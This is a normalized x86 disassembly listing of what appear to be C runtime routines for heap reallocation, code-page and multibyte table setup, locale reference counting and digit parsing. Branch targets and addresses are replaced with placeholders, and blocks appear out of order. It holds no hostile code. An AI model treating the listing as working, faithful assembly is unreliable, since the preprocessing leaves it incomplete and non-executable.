mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
cmp edi 0x20
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_4490f8
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
cmp edx 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_448d0f
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
test ecx ecx
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_448c5f
mov ebx eax
mov [ ebp + 0x8 ] ebx
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_4493dd
push 0x10
push r--data
call sub_4433dc
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_443b37
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_440791
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_4488e6
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_448919
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_443421
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_449477
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_449480
push 0x10
push r--data
call sub_4433dc
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_441c3d
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_44120e
pop ecx
jmp r-xdata
call sub_443421
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_443b8f
pop ecx
call sub_443b37
push 0x4
call sub_4488e6
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_448919
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4495c4
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_448e17
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_443b8f
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_4490f8
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_443b37
call sub_443b37
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_443b8f
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_443af5
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_443b37
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_443b37
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_443790
push ebx
call sub_448919
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_448949
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_443af5
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_443790
push ebx
push [ ebp - 0x20 ]
call sub_448949
add esp 0x14
mov eax esi
sub_44969b
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_4496ca
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_443360
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_44972e
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_452aee
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_44d8fe
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_44d8fe
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_443360
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_4498c1
push 0xc
push r--data
call sub_4433dc
call sub_445601
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_4488e6
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_44995c
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_443421
retn
push 0x20
call sub_445acd
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_44120e
pop ecx
sub_449965
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_441455
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_4499e1
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_449965
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_4496ca
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_443360
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_44969b
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_44972e
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_443360
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_44969b
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_449bc6
push 0x14
push r--data
call sub_4433dc
or [ ebp - 0x20 ] 0xffffffff
call sub_445601
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_4498c1
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_449965
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_445f36
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_443421
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_4499e1
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_443b37
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_44120e
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_44120e
pop ecx
push 0xd
call sub_4488e6
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_449d27
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_44120e
pop ecx
sub_449d7e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_44120e
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_44120e
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_44120e
push [ esi + 0xc0 ]
call sub_44120e
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_452b30
push [ edi ]
call sub_44120e
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_44120e
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_44120e
pop ecx
push [ esi + 0xb0 ]
call sub_44120e
push [ esi + 0xbc ]
call sub_44120e
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_44120e
push [ esi + 0xbc ]
call sub_452d0a
pop ecx
pop ecx
push eax
call sub_44120e
pop ecx
push eax
call sub_44120e
push [ esi + 0xbc ]
call sub_452cc5
pop ecx
pop ecx
sub_449ec7
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_449f56
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_449fef
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_449ec7
pop ecx
test esi esi
je r-xdata
push esi
call sub_449f56
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_449d7e
pop ecx
sub_44a02d
push 0xc
push r--data
call sub_4433dc
call sub_445601
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_4488e6
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_449fef
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_44a097
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_445601
mov esi [ eax + 0x6c ]
mov eax esi
call sub_443421
retn
push 0x20
call sub_445acd
pop ecx
sub_44a0a3
mov edi edi
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
cmp ax 0x30
jae r-xdata
cmp ax 0x3a
jae r-xdata
mov eax 0xffffffff
pop ebp
retn
mov ecx 0xff10
mov edx ecx
cmp ax dx
jae r-xdata
movzx eax ax
sub eax 0x30
pop ebp
retn
mov edx 0xff1a
mov ecx 0x660
mov edx ecx
cmp ax dx
jb r-xdata
movzx eax ax
sub eax ecx
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
add edx 0xa
cmp ax dx
jae r-xdata
mov ecx 0x6f0
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0x966
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0x9e6
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
